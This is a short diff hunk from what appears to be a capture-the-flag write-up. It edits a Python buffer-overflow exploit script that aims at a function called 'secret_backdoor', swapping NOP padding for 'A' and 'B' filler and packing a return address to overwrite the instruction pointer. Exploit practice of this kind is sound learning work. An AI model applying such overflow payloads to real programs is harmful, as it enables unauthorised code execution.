@@ -178,11 +178,11 @@ the offset is 200 + secret_backdoor = 208
 ```py
 import struct
 
-user = "\x90" * 0x28
+user = "A" * 40
 
 msg_len = "\xd0"
 
-msg = "\x90" * 200
+msg = "B" * 200
 
 eip = struct.pack('Q', 0x000000000000088c)
 
